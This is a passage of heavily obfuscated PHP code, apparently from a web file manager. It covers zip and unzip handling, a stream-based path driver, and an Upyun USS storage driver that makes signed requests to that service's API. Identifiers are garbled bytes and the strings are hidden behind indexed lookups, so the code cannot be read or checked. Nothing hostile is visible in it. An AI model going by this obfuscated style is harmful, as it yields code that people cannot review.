IO::init($_SERVER[ú‡®¯¨±][8]); return $©Ñ¼îÃò; } private static function iconvSystem($øŒÊìäí) { return self::local()->iconvSystem($øŒÊìäí); } private static function iconvApp($ÕäÔÌ¡İ) { return self::local()->iconvApp($ÕäÔÌ¡İ); } public static function zipFolder($îÛæŞØğ, $—ó¦‚Ã§ = "\x7a\151\160", $æÚı¤–µ = '', $Ÿ‡ƒ³â§ = REPEAT_RENAME) { $ÌêÎã§ =& $_SERVER[ú‡®¯¨±]; $»«¥¸§ = IO::listPath($îÛæŞØğ); if (!$»«¥¸§) { return !1; } $»«¥¸§ = array_merge($»«¥¸§[$ÌêÎã§[84]], $»«¥¸§[$ÌêÎã§[85]]); return self::zip($»«¥¸§, $—ó¦‚Ã§, $æÚı¤–µ, $Ÿ‡ƒ³â§); } public static function zip($Ïæœ¢Æà, $¹Î“Ğ—³ = "\x7a\151\160", $‘ì ¿ÄÎ = '', $è …Øı = REPEAT_RENAME) { $Ù÷Ş‡ì =& $_SERVER[ú‡®¯¨±]; if (is_string($Ïæœ¢Æà) && $Ïæœ¢Æà) { $Ïæœ¢Æà = array(array($Ù÷Ş‡ì[86] => $Ïæœ¢Æà)); } $Æ®¤à = self::init($Ïæœ¢Æà[0][$Ù÷Ş‡ì[86]]); $ùƒî›ÚÖ = self::info($Ïæœ¢Æà[0][$Ù÷Ş‡ì[86]]); $³ÆÏÆ£¹ = $Ù÷Ş‡ì[12]; $¬ßÚ–ú = $Ù÷Ş‡ì[12]; $•´¶©ı‰ = $Ù÷Ş‡ì[12]; if ($‘ì ¿ÄÎ && substr($‘ì ¿ÄÎ, -1, 1) != $Ù÷Ş‡ì[8]) { $¬ßÚ–ú = get_path_father($‘ì ¿ÄÎ); $•´¶©ı‰ = get_path_this($‘ì ¿ÄÎ); } else { $¬ßÚ–ú = self::pathFather($ùƒî›ÚÖ[$Ù÷Ş‡ì[86]]); $•´¶©ı‰ = $ùƒî›ÚÖ[$Ù÷Ş‡ì[32]] . $Ù÷Ş‡ì[10] . $¹Î“Ğ—³; if (count($Ïæœ¢Æà) > 1) { $ƒäğè¡Ä = IO::info($¬ßÚ–ú); $•´¶©ı‰ = $ƒäğè¡Ä[$Ù÷Ş‡ì[32]] . $Ù÷Ş‡ì[10] . $¹Î“Ğ—³; } if ($‘ì ¿ÄÎ) { $¬ßÚ–ú = $‘ì ¿ÄÎ; } } if ($Æ®¤à->getType() == $Ù÷Ş‡ì[108]) { $Üãª§·° = self::init($¬ßÚ–ú); $»ÎÍöµï = $Üãª§·°->getType() == $Ù÷Ş‡ì[108] ? $¬ßÚ–ú : get_path_father($Æ®¤à->path); $»ÎÍöµï = rtrim($»ÎÍöµï, $Ù÷Ş‡ì[8]) . $Ù÷Ş‡ì[8]; mk_dir($»ÎÍöµï); } else { $³ÆÏÆ£¹ = TEMP_FILES . $Ù÷Ş‡ì[1239] . time() . rand_string(8) . $Ù÷Ş‡ì[8]; mk_dir($³ÆÏÆ£¹); file_put_contents($³ÆÏÆ£¹ . $Ù÷Ş‡ì[1240], $Ù÷Ş‡ì[12]); $»ÎÍöµï = $³ÆÏÆ£¹; } $Ùõ’ÏÏ¿ = IO::info($»ÎÍöµï); if (!$Ùõ’ÏÏ¿ || !$Ùõ’ÏÏ¿[$Ù÷Ş‡ì[229]]) { show_json(LNG($Ù÷Ş‡ì[1241]), !1); } $ÄÈğ±Áâ = self::zipFileList($Ïæœ¢Æà, $³ÆÏÆ£¹); foreach ($ÄÈğ±Áâ as $Äåïı‰Ù => $é·û¼ÊÛ) { $ÄÈğ±Áâ[$Äåïı‰Ù] = self::iconvSystem($é·û¼ÊÛ); } $ã—°ğ® = get_filename_auto($»ÎÍöµï . $•´¶©ı‰, $Ù÷Ş‡ì[12], $è …Øı); KodArchive::create(self::iconvSystem($ã—°ğ®), $ÄÈğ±Áâ); if (!IO::exist($ã—°ğ®)) { if ($³ÆÏÆ£¹) { del_dir($³ÆÏÆ£¹); } show_json(LNG($Ù÷Ş‡ì[1242]), !1); } if (!$³ÆÏÆ£¹) { return $ã—°ğ®; } $ÖÕŒÀİŒ = self::move($ã—°ğ®, $¬ßÚ–ú, $è …Øı); if ($³ÆÏÆ£¹) { del_dir($³ÆÏÆ£¹); } if (!$ã—°ğ®) { show_json(LNG($Ù÷Ş‡ì[1242]), !1); } return $ÖÕŒÀİŒ; } public static function unzip($†¸¾“Íä, $æğ²®Ë€, $äİ¤ƒ¦© = "\x2d\61", $ÖÅƒ–«ş = "\162\145\x70\154\141\143\145") { $«ûç¸” =& $_SERVER[ú‡®¯¨±]; $•½ûİô² = parent::info($†¸¾“Íä); if (!$•½ûİô²) { show_json(LNG($«ûç¸”[1243]), !1); } $·ÊãĞòŸ = IO::infoFullSimple($æğ²®Ë€); if (!$·ÊãĞòŸ) { $æğ²®Ë€ = IO::mkdir($æğ²®Ë€); } if (isset($·ÊãĞòŸ[$«ûç¸”[183]]) && trim($·ÊãĞòŸ[$«ûç¸”[86]], $«ûç¸”[8]) != trim($æğ²®Ë€, $«ûç¸”[8])) { $úÊã´Ö = KodIO::make($·ÊãĞòŸ[$«ûç¸”[182]]); $»ÁÍşš = IO::fileNameAuto($úÊã´Ö, $·ÊãĞòŸ[$«ûç¸”[32]], REPEAT_RENAME_FOLDER, !0); $æğ²®Ë€ = IO::mkdir($úÊã´Ö . $»ÁÍşš); } $äİ¤ƒ¦© = $äİ¤ƒ¦© && $äİ¤ƒ¦© != $«ûç¸”[1244] ? @json_decode($äİ¤ƒ¦©, !0) : -1; $­ãàè­Ú = self::unzipPart($†¸¾“Íä, $äİ¤ƒ¦©); if (!$­ãàè­Ú || !IO::exist($­ãàè­Ú[$«ûç¸”[226]])) { show_json(LNG($«ûç¸”[107]), !1); } $¿ÇÀ˜ì˜ = $­ãàè­Ú[$«ûç¸”[1245]][count($­ãàè­Ú[$«ûç¸”[1245]]) - 1]; if ($¿ÇÀ˜ì˜[$«ûç¸”[1246]] == -1 || substr($¿ÇÀ˜ì˜[$«ûç¸”[32]], -1, 1) == $«ûç¸”[8]) { $‹Ç÷Ä£ = $­ãàè­Ú[$«ûç¸”[1247]] . rand_string(10) . $«ûç¸”[8]; mk_dir($‹Ç÷Ä£); $èĞÌ¡ı‘ = count($­ãàè­Ú[$«ûç¸”[1245]]) == 1 ? IO::ext($†¸¾“Íä) : get_path_ext($­ãàè­Ú[$«ûç¸”[226]]); $€ß§³İİ = KodArchive::extract(self::iconvSystem($­ãàè­Ú[$«ûç¸”[226]]), $‹Ç÷Ä£, $¿ÇÀ˜ì˜[$«ûç¸”[1246]], $»ÁÍşš, $èĞÌ¡ı‘); self::unzipErrorCheck($€ß§³İİ, array($«ûç¸”[1248], $†¸¾“Íä, $èĞÌ¡ı‘, $æğ²®Ë€, $­ãàè­Ú)); Hook::trigger($«ûç¸”[1249], $‹Ç÷Ä£); recursion_dir($‹Ç÷Ä£, $Ä›¾íÆš, $÷‡ò®Šñ, 0); $±°Ä¸ã = array_merge($Ä›¾íÆš, $÷‡ò®Šñ); $äáòö = array(); foreach ($±°Ä¸ã as $ªàÁÄÊª) { $¶‘é£¥ï = IO::move(self::iconvApp($ªàÁÄÊª), $æğ²®Ë€, $ÖÅƒ–«ş); if ($¶‘é£¥ï) { $äáòö[] = $¶‘é£¥ï; } } del_dir($‹Ç÷Ä£); } else { $¶‘é£¥ï = IO::move($­ãàè­Ú[$«ûç¸”[226]], $æğ²®Ë€, $ÖÅƒ–«ş, get_path_this($¿ÇÀ˜ì˜[$«ûç¸”[32]])); if ($¶‘é£¥ï) { $äáòö[] = $¶‘é£¥ï; } } return $äáòö ? $äáòö : !1; } public static function unzipList($µÍı‘Øø) { $Ğ´÷ùğ¾ =& $_SERVER[ú‡®¯¨±]; $—……†ª = isset($µÍı‘Øø[$Ğ´÷ùğ¾[1250]]) ? $µÍı‘Øø[$Ğ´÷ùğ¾[1250]] : !1; $³–´¨Æ‘ = isset($µÍı‘Øø[$Ğ´÷ùğ¾[1246]]) ? @json_decode($µÍı‘Øø[$Ğ´÷ùğ¾[1246]], !0) : -1; $¥îïÂÇ¬ = self::unzipPart($µÍı‘Øø[$Ğ´÷ùğ¾[86]], $³–´¨Æ‘); if (!$¥îïÂÇ¬ || !IO::exist($¥îïÂÇ¬[$Ğ´÷ùğ¾[226]])) { show_json(LNG($Ğ´÷ùğ¾[107]), !1); } $‡ãê© ñ = $¥îïÂÇ¬[$Ğ´÷ùğ¾[1245]][count($¥îïÂÇ¬[$Ğ´÷ùğ¾[1245]]) - 1]; $¢ßÄˆ˜± = in_array(IO::ext($¥îïÂÇ¬[$Ğ´÷ùğ¾[226]]), array($Ğ´÷ùğ¾[368], $Ğ´÷ùğ¾[1251], $Ğ´÷ùğ¾[1252], $Ğ´÷ùğ¾[1253], $Ğ´÷ùğ¾[1254], $Ğ´÷ùğ¾[1255])); if (!$—……†ª && ($‡ãê© ñ[$Ğ´÷ùğ¾[1246]] == -1 || $¢ßÄˆ˜±)) { $âÀÀŸ„œ = $¥îïÂÇ¬[$Ğ´÷ùğ¾[1247]] . get_path_this($¥îïÂÇ¬[$Ğ´÷ùğ¾[226]]) . $Ğ´÷ùğ¾[1256]; if (!IO::exist($âÀÀŸ„œ)) { $­é¦¼İå = $‡ãê© ñ[$Ğ´÷ùğ¾[1246]] == -1 ? get_path_ext(IO::pathThis($µÍı‘Øø[$Ğ´÷ùğ¾[86]])) : get_path_ext($¥îïÂÇ¬[$Ğ´÷ùğ¾[226]]); $©®éªçÑ = KodArchive::listContent(self::iconvSystem($¥îïÂÇ¬[$Ğ´÷ùğ¾[226]]), !0, $­é¦¼İå); self::unzipErrorCheck($©®éªçÑ, array($Ğ´÷ùğ¾[1257], $µÍı‘Øø, $¥îïÂÇ¬)); @file_put_contents($âÀÀŸ„œ, json_encode($©®éªçÑ[$Ğ´÷ùğ¾[1258]])); } return @json_decode(IO::getContent($âÀÀŸ„œ), !0); } IO::fileOut($¥îïÂÇ¬[$Ğ´÷ùğ¾[226]], $—……†ª, get_path_this($‡ãê© ñ[$Ğ´÷ùğ¾[32]])); die; } private static function zipFileList($ò½Á•¿, $¥ÖõÈÜ³ = false) { $¶²û×ĞÌ =& $_SERVER[ú‡®¯¨±]; $ƒÛĞ‰ = array(); foreach ($ò½Á•¿ as $ÖİÕå½) { $ïã£ŒÆ = $ÖİÕå½[$¶²û×ĞÌ[86]]; if ($¥ÖõÈÜ³) { $ïã£ŒÆ = self::copy($ÖİÕå½[$¶²û×ĞÌ[86]], $¥ÖõÈÜ³, $¶²û×ĞÌ[873]); } else { $ßò™ù¿ = self::init($ÖİÕå½[$¶²û×ĞÌ[86]]); if ($ßò™ù¿->getType() == $¶²û×ĞÌ[108]) { $ïã£ŒÆ = $ßò™ù¿->path; } } if ($ïã£ŒÆ && self::local()->exist($ïã£ŒÆ)) { $ƒÛĞ‰[$ÖİÕå½[$¶²û×ĞÌ[86]]] = $ïã£ŒÆ; } } if (!empty($ƒÛĞ‰)) { return array_values($ƒÛĞ‰); } show_json(LNG($¶²û×ĞÌ[1221]), !1); } private static function localFilePath($ñÜ¥Ô³) { $ªŞ¦™ú =& $_SERVER[ú‡®¯¨±]; $Ãƒ°Ò‚ã = KodIO::parse($ñÜ¥Ô³); if ($Ãƒ°Ò‚ã[$ªŞ¦™ú[33]] == KodIO::KOD_SOURCE) { $¡€ğƒ¹Õ = Model($ªŞ¦™ú[880])->fileInfoGet(KodIO::sourceID($ñÜ¥Ô³)); if (!$¡€ğƒ¹Õ[$ªŞ¦™ú[86]]) { show_json($ªŞ¦™ú[1259], !1); } $ñÜ¥Ô³ = $¡€ğƒ¹Õ[$ªŞ¦™ú[86]]; } $¥ùĞ–æº = self::init($ñÜ¥Ô³); if ($¥ùĞ–æº->pathParse[$ªŞ¦™ú[1207]]) { $ñÜ¥Ô³ = $¥ùĞ–æº->pathParse[$ªŞ¦™ú[1207]]; $¥ùĞ–æº = self::init($ñÜ¥Ô³); } $ÉââÎÏ› = $¥ùĞ–æº->getType(); if ($ÉââÎÏ› == $ªŞ¦™ú[108] || $ÉââÎÏ› == $ªŞ¦™ú[1260]) { if (!$¥ùĞ–æº->exist($¥ùĞ–æº->path)) { show_json(LNG($ªŞ¦™ú[107]), !1); } return $¥ùĞ–æº->path; } return !1; } public static function unzipPart($–èªÌ–™, $Ù£ÓŸì… = -1) { $ÃÊÉĞ¶ =& $_SERVER[ú‡®¯¨±]; $¬ÆåÃÒ¹ = IO::pathThis($–èªÌ–™); if (!$Ù£ÓŸì… || $Ù£ÓŸì… == -1) { $›áÉ–ä = array(array($ÃÊÉĞ¶[32] => $¬ÆåÃÒ¹, $ÃÊÉĞ¶[1246] => -1)); $›áÉ–ä[0][$ÃÊÉĞ¶[1261]] = $›áÉ–ä[0][$ÃÊÉĞ¶[32]]; } else { if (is_array($Ù£ÓŸì…)) { $›áÉ–ä = $Ù£ÓŸì…; $‚ø¼œí¡ = count($›áÉ–ä) - 1; for ($ü¢È·™Ä = 0; $ü¢È·™Ä <= $‚ø¼œí¡; $ü¢È·™Ä++) { $§ìüµšÑ = $›áÉ–ä[$ü¢È·™Ä]; $š±ëÍ³ = get_path_this($§ìüµšÑ[$ÃÊÉĞ¶[32]]) . (checkExtSafe($§ìüµšÑ[$ÃÊÉĞ¶[32]]) ? $ÃÊÉĞ¶[12] : $ÃÊÉĞ¶[1262]); $›áÉ–ä[$ü¢È·™Ä][$ÃÊÉĞ¶[1261]] = $ÃÊÉĞ¶[1263] . intval($§ìüµšÑ[$ÃÊÉĞ¶[1246]]) . $ÃÊÉĞ¶[440] . $š±ëÍ³; if ($ü¢È·™Ä == 0) { continue; } $›áÉ–ä[$ü¢È·™Ä][$ÃÊÉĞ¶[1261]] = $›áÉ–ä[$ü¢È·™Ä - 1][$ÃÊÉĞ¶[1261]] . $ÃÊÉĞ¶[1264] . $›áÉ–ä[$ü¢È·™Ä][$ÃÊÉĞ¶[1261]]; } } } if (!is_array($›áÉ–ä) || count($›áÉ–ä) == 0) { return !1; } $şÇÈåµ¥ = $›áÉ–ä[count($›áÉ–ä) - 1]; if (!IO::exist($–èªÌ–™)) { return !1; } $Ş„ ª« = TEMP_FILES . $ÃÊÉĞ¶[1265] . kodIO::hashPathSafe($–èªÌ–™) . $ÃÊÉĞ¶[8]; $Ë‹ïú… = $Ş„ ª« . $şÇÈåµ¥[$ÃÊÉĞ¶[1261]]; mk_dir($Ş„ ª«); file_put_contents(TEMP_FILES . $ÃÊÉĞ¶[1240], $ÃÊÉĞ¶[12]); if (IO::exist($Ë‹ïú…)) { return array($ÃÊÉĞ¶[226] => $Ë‹ïú…, $ÃÊÉĞ¶[1245] => $›áÉ–ä, $ÃÊÉĞ¶[1247] => $Ş„ ª«); } $Š›½ı—ù = self::localFilePath($–èªÌ–™); if (!$Š›½ı—ù) { $Š›½ı—ù = $Ş„ ª« . $ÃÊÉĞ¶[1266]; if (!IO::exist($Š›½ı—ù)) { self::copy($–èªÌ–™, $Ş„ ª«, !1, get_path_this($Š›½ı—ù)); } } if (!$Š›½ı—ù || !IO::exist($Š›½ı—ù)) { return !1; } if ($şÇÈåµ¥[$ÃÊÉĞ¶[1246]] == -1) { return array($ÃÊÉĞ¶[226] => $Š›½ı—ù, $ÃÊÉĞ¶[1245] => $›áÉ–ä, $ÃÊÉĞ¶[1247] => $Ş„ ª«); } $Ù¼¹š¾ø = $Š›½ı—ù; foreach ($›áÉ–ä as $ü¢È·™Ä => $§ìüµšÑ) { if (!$§ìüµšÑ || $§ìüµšÑ[$ÃÊÉĞ¶[1246]] == $ÃÊÉĞ¶[1244]) { break; } if (substr($§ìüµšÑ[$ÃÊÉĞ¶[32]], -1, 1) == $ÃÊÉĞ¶[8]) { break; } $ä§µİÑï = in_array(get_path_ext($§ìüµšÑ[$ÃÊÉĞ¶[1261]]), array($ÃÊÉĞ¶[368], $ÃÊÉĞ¶[1251], $ÃÊÉĞ¶[1252], $ÃÊÉĞ¶[1253], $ÃÊÉĞ¶[1254], $ÃÊÉĞ¶[1255])); $Ùé™İù = $ü¢È·™Ä == count($›áÉ–ä) - 1 && $ä§µİÑï; $›ã¦²ÛŒ = $Ş„ ª« . $§ìüµšÑ[$ÃÊÉĞ¶[1261]]; $äØÇå©÷ = $Ş„ ª« . get_path_this($§ìüµšÑ[$ÃÊÉĞ¶[32]]); if (IO::exist($›ã¦²ÛŒ)) { $Ù¼¹š¾ø = $›ã¦²ÛŒ; continue; } $¶“²öåô = $ü¢È·™Ä == 0 ? get_path_ext($¬ÆåÃÒ¹) : get_path_ext($Ù¼¹š¾ø); $úğëôª¦ = KodArchive::extract(self::iconvSystem($Ù¼¹š¾ø), $Ş„ ª«, $§ìüµšÑ[$ÃÊÉĞ¶[1246]], $“§€öÆé, $¶“²öåô); self::unzipErrorCheck($úğëôª¦, array($ÃÊÉĞ¶[1267], $–èªÌ–™, $›áÉ–ä, $§ìüµšÑ, $›ã¦²ÛŒ)); if (IO::exist($äØÇå©÷)) { IO::rename($äØÇå©÷, get_path_this($›ã¦²ÛŒ)); } $Ù¼¹š¾ø = $›ã¦²ÛŒ; } $Ë‹ïú… = $Ù¼¹š¾ø; return array($ÃÊÉĞ¶[226] => $Ù¼¹š¾ø, $ÃÊÉĞ¶[1245] => $›áÉ–ä, $ÃÊÉĞ¶[1247] => $Ş„ ª«); } private static function unzipErrorCheck($º¦‰ÉëÙ, $Áã§²Ù£ = false) { $åäÎ¶¾š =& $_SERVER[ú‡®¯¨±]; if ($º¦‰ÉëÙ[$åäÎ¶¾š[1268]]) { return !0; } write_log(array($åäÎ¶¾š[1269], $º¦‰ÉëÙ, $Áã§²Ù£), $åäÎ¶¾š[1270]); show_json($åäÎ¶¾š[1271] . json_encode($º¦‰ÉëÙ[$åäÎ¶¾š[1258]]), !1); die; } } goto b¥îâÈù’½; fÄ“È®áî»: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Õà¡ ¡’, $§ñš±Şà = 0) { parent::__construct(); $this->source = $Õà¡ ¡’; $this->sourceSize = $§ñš±Şà; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($²ü´Ğ›ş = false) { return $this->sourceSize; } public function getContent($òàÀ±®ö = false) { return $this->fileSubstr($òàÀ±®ö, 0, $this->sourceSize); } public function fileSubstr($È™Ş¾‚© = false, $Æ‚†ªÔ‚ = 0, $Â«÷àı³ = 0) { if (!$Â«÷àı³) { $Â«÷àı³ = $this->sourceSize; } $‘¸Àæ•§ = $this->sourceSize - $Æ‚†ªÔ‚; if ($Â«÷àı³ >= $‘¸Àæ•§) { $Â«÷àı³ = $‘¸Àæ•§; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Æ‚†ªÔ‚, $Â«÷àı³); } if ($this->sourceType == self::TYPE_FILE) { if ($Â«÷àı³ <= 0) { return $_SERVER[ú‡®¯¨±][12]; } $ìµ±¸´¦ = ftell($this->source); fseek_64($this->source, $ìµ±¸´¦ + $Æ‚†ªÔ‚); $íô«¸×Ï = @fread($this->source, $Â«÷àı³); fseek_64($this->source, $ìµ±¸´¦); return $íô«¸×Ï; } } public function hashMd5($×ï†²—ù = false) { return md5($this->getContent()); } public static function hash($§§‘‘‚, $Å”¡‘ÆÌ = 0) { $é¯ûßÜ = new PathDriverStream($§§‘‘‚, $Å”¡‘ÆÌ); return $é¯ûßÜ->hashSimple($§§‘‘‚); } public static function md5($ıÆÀı‚, $µ–è÷ª² = 0) { $ ®ÈĞâï = new PathDriverStream($ıÆÀı‚, $µ–è÷ª²); return $ ®ÈĞâï->hashMd5($ıÆÀı‚); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\57\57\166\x30\56\x61\160\x69\x2e\x75\160\x79\x75\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($«…Ø˜ûæ) { parent::__construct(); $this->_init($«…Ø˜ûæ); } public function _init($£¾…ÌŸ) { $øä—ª€Å =& $_SERVER[ú‡®¯¨±]; foreach ($£¾…ÌŸ as $×‡ØúÔ´ => $›Â€‘…Ä) { if (isset($this->{$×‡ØúÔ´})) { $this->{$×‡ØúÔ´} = $›Â€‘…Ä; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($øä—ª€Å[1497] . LNG($øä—ª€Å[1429])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($úÙÄÏãæ, $†¶Û¨ÌŞ = "\107\105\x54") { $è¡ÒºØ¡ =& $_SERVER[ú‡®¯¨±]; $ºƒ“ŠÜ£ = gmdate($è¡ÒºØ¡[1462]); $—±©áÏ = base64_encode(hash_hmac($è¡ÒºØ¡[1498], "{$†¶Û¨ÌŞ}\46{$úÙÄÏãæ}\46{$ºƒ“ŠÜ£}", md5("{$this->userpass}"), !0)); $’­½ÏãÉ = array("\101\165\x74\x68\157\162\151\x7a\x61\x74\x69\157\x6e\72\x55\120\131\125\116\40{$this->username}\72{$—±©áÏ}", "\104\141\x74\x65\72{$ºƒ“ŠÜ£}"); return $’­½ÏãÉ; } public function ussRequest($ü“¶Ç, $Š¯Ñó°¤ = "\107\105\x54", $¦˜Ÿ¯÷Ÿ = false, $¿ï¢õîØ = false, $¡§àÕÍÇ = false) { $âšñ»ç =& $_SERVER[ú‡®¯¨±]; $ü“¶Ç = trim($ü“¶Ç, $âšñ»ç[8]); $ğªè¤Ææ = "\57{$this->bucket}\57{$ü“¶Ç}"; $”—œ•“ğ = $this->ussHeaders($ğªè¤Ææ, $Š¯Ñó°¤); if ($¿ï¢õîØ) { $”—œ•“ğ = array_merge($”—œ•“ğ, $¿ï¢õîØ); } $òú´¬æ² = url_request($this->endpoint . $ğªè¤Ææ, $Š¯Ñó°¤, $¦˜Ÿ¯÷Ÿ, $”—œ•“ğ, $¡§àÕÍÇ); if (!$òú´¬æ²) { return array($âšñ»ç[1268] => !1, $âšñ»ç[1258] => $âšñ»ç[1499]); } if (strtolower($Š¯Ñó°¤) == $âšñ»ç[223] || in_array($òú´¬æ²[$âšñ»ç[1268]], array($âšñ»ç[268], $âšñ»ç[1500]))) { $¦˜Ÿ¯÷Ÿ = $òú´¬æ²[$âšñ»ç[1501]]; } else { $¦˜Ÿ¯÷Ÿ = json_decode($òú´¬æ²[$âšñ»ç[1258]], !0); if (!$¦˜Ÿ¯÷Ÿ) { $¦˜Ÿ¯÷Ÿ = $òú´¬æ²[$âšñ»ç[1258]]; } else { if (!$òú´¬æ²[$âšñ»ç[805]] && isset($¦˜Ÿ¯÷Ÿ[$âšñ»ç[1502]])) { $¦˜Ÿ¯÷Ÿ = $¦˜Ÿ¯÷Ÿ[$âšñ»ç[1502]]; } } } return array($âšñ»ç[1268] => $òú´¬æ²[$âšñ»ç[805]], $âšñ»ç[1258] => $¦˜Ÿ¯÷Ÿ); } public function mkfile($Àå…©é, $éÑØÉÑ« = '', $µ¯ƒ›º” = REPEAT_RENAME) { if ($this->setContent($Àå…©é, $éÑØÉÑ«)) { return $this->getPathOuter($Àå…©é); } return !1; } public function mkdir($õÛ‹´è, $“£ÉâÔÖ = REPEAT_SKIP) { $ºÓªÚë” =& $_SERVER[ú‡®¯¨±]; $ÉÓ¬¸  = trim($õÛ‹´è, $ºÓªÚë”[8]); if ($this->_isFolder($ÉÓ¬¸ )) { return $this->getPathOuter($ÉÓ¬¸ ); } $ÕêÊ«« = array($ºÓªÚë”[1503]); $ğØã£Æş = $this->ussRequest($ÉÓ¬¸ , $ºÓªÚë”[253], !1, $ÕêÊ««); return $ğØã£Æş[$ºÓªÚë”[1268]] ? $this->getPathOuter($ÉÓ¬¸ ) : !1; } public function copyFile($Ó¨«¨°, $©Á‰ƒ‚°) { $ùøğÚˆ =& $_SERVER[ú‡®¯¨±]; $íµ®»´Ó = array($ùøğÚˆ[1504] . "\57{$this->bucket}\57{$Ó¨«¨°}", $ùøğÚˆ[1505]); $ãÌÄ“íù = $this->ussRequest($©Á‰ƒ‚°, $ùøğÚˆ[255], !1, $íµ®»´Ó); return $ãÌÄ“íù[$ùøğÚˆ[1268]] ? !0 : $this->getPathOuter($©Á‰ƒ‚°); } public function moveFile($üºÖšÙš, $®¨À²µÍ) { $Ã¸Œí†Æ =& $_SERVER[ú‡®¯¨±]; $óÛÙ¨´× = array($Ã¸Œí†Æ[1506] . "\57{$this->bucket}\57{$üºÖšÙš}", $Ã¸Œí†Æ[1505]); $ŞÎâ½ú¢ = $this->ussRequest($®¨À²µÍ, $Ã¸Œí†Æ[255], !1, $óÛÙ¨´×); return $ŞÎâ½ú¢[$Ã¸Œí†Æ[1268]] ? !0 : $this->getPathOuter($®¨À²µÍ); } public function delFile($ç®û°¥Ş) { $ª¯Ñ˜¯Ê =& $_SERVER[ú‡®¯¨±]; $»›®™° = $this->ussRequest($ç®û°¥Ş, $ª¯Ñ˜¯Ê[1507]); return $»›®™°[$ª¯Ñ˜¯Ê[1268]] ? !0 : !1; } public function delFolder($ãáíƒÒ) { $Êø¿÷§ó =& $_SERVER[ú‡®¯¨±]; if (!$this->exist($ãáíƒÒ)) { return !0; } $this->listItemCache = !1; $÷âğ˜õş = $ğ¯¢•Õœ = array(); $this->fileList($ãáíƒÒ, $÷âğ˜õş, $ğ¯¢•Õœ, !0); $this->listItemCache = !0; foreach ($ğ¯¢•Õœ as $¼ÈÔï¬°) { $ÆØÌıÌ = $this->ussRequest($¼ÈÔï¬°[$Êø¿÷§ó[32]], $Êø¿÷§ó[1507]); if (!$ÆØÌıÌ[$Êø¿÷§ó[1268]]) { return !1; } } foreach ($÷âğ˜õş as $¿·É•°Å) { $ÆØÌıÌ = $this->ussRequest($¿·É•°Å, $Êø¿÷§ó[1507]); if (!$ÆØÌıÌ[$Êø¿÷§ó[1268]]) { return !1; } } $ÆØÌıÌ = $this->ussRequest($ãáíƒÒ, $Êø¿÷§ó[1507]); return $ÆØÌıÌ[$Êø¿÷§ó[1268]]; } public function rename($ÖêÆ©ş, $ëî½œ) { if ($this->isFile($ÖêÆ©ş)) { $ëî½œ = get_path_father($ÖêÆ©ş) . $ëî½œ; return $this->moveFile($ÖêÆ©ş, $ëî½œ); } return $this->renameObject($ÖêÆ©ş, $ëî½œ); } public function fileInfo($²Ôş¸í, $Ä£¹¬ìË = false, $ÙòÇ²Î¸ = array()) { $Ûö¤¥±· =& $_SERVER[ú‡®¯¨±]; $ÙÑÇ©Õí = array($Ûö¤¥±·[32] => $this->pathThis($²Ôş¸í), $Ûö¤¥±·[86] => $this->getPathOuter($Ûö¤¥±·[8] . $²Ôş¸í), $Ûö¤¥±·[33] => $Ûö¤¥±·[226], $Ûö¤¥±·[78] => isset($ÙòÇ²Î¸[$Ûö¤¥±·[78]]) ? $ÙòÇ²Î¸[$Ûö¤¥±·[78]] : 0, $Ûö¤¥±·[177] => $this->ext($²Ôş¸í)); if ($Ä£¹¬ìË) { return $ÙÑÇ©Õí; } $ÙÑÇ©Õí[$Ûö¤¥±·[227]] = $ÙÑÇ©Õí[$Ûö¤¥±·[87]] = 0; $ÙÑÇ©Õí[$Ûö¤¥±·[228]] = $ÙÑÇ©Õí[$Ûö¤¥±·[229]] = !0; if (empty($ÙòÇ²Î¸)) { $ÙòÇ²Î¸ = $this->objectMeta($²Ôş¸í); if (!$ÙòÇ²Î¸) { return $ÙÑÇ©Õí; } } $ÙÑÇ©Õí[$Ûö¤¥±·[227]] = intval($ÙòÇ²Î¸[$Ûö¤¥±·[1508]]); $ÙÑÇ©Õí[$Ûö¤¥±·[87]] = intval($ÙòÇ²Î¸[$Ûö¤¥±·[1509]]); $ÙÑÇ©Õí[$Ûö¤¥±·[78]] = $ÙòÇ²Î¸[$Ûö¤¥±·[78]]; return $ÙÑÇ©Õí; } public function folderInfo($İ†’Ì‡†, $¥ì³›• = false) { $‘¼ì±â¸ =& $_SERVER[ú‡®¯¨±]; $”×èâ›± = array($‘¼ì±â¸[32] => $this->pathThis($İ†’Ì‡†), $‘¼ì±â¸[86] => $this->getPathOuter($‘¼ì±â¸[8] . $İ†’Ì‡†), $‘¼ì±â¸[33] => $‘¼ì±â¸[77]); if ($¥ì³›•) { return $”×èâ›±; } $”×èâ›±[$‘¼ì±â¸[227]] = $”×èâ›±[$‘¼ì±â¸[87]] = 0; $”×èâ›±[$‘¼ì±â¸[228]] = $”×èâ›±[$‘¼ì±â¸[229]] = !0; if (empty($‰åÀ©êÖ)) { $‰åÀ©êÖ = $this->objectMeta($İ†’Ì‡†); if (!$‰åÀ©êÖ) { return $”×èâ›±; } } $”×èâ›±[$‘¼ì±â¸[227]] = intval($‰åÀ©êÖ[$‘¼ì±â¸[1508]]); $”×èâ›±[$‘¼ì±â¸[87]] = intval($‰åÀ©êÖ[$‘¼ì±â¸[1509]]); return $”×èâ›±; } private function listObjs($Ïí¨à, $‘€´„ï½ = 0, $ÍãÅ¬é• = 1000) { $÷ÙÉÃÎ÷ =& $_SERVER[ú‡®¯¨±]; $ì„œœ¨Ø = array($÷ÙÉÃÎ÷[1510], $÷ÙÉÃÎ÷[1511] . $ÍãÅ¬é•); if ($‘€´„ï½) { $ì„œœ¨Ø[] = $÷ÙÉÃÎ÷[1512] . $‘€´„ï½; } $ÉÅ­É¨ = $this->ussRequest($Ïí¨à, $÷ÙÉÃÎ÷[257], !1, $ì„œœ¨Ø); return !$ÉÅ­É¨[$÷ÙÉÃÎ÷[1268]] ? !1 : $ÉÅ­É¨[$÷ÙÉÃÎ÷[1258]]; } private function 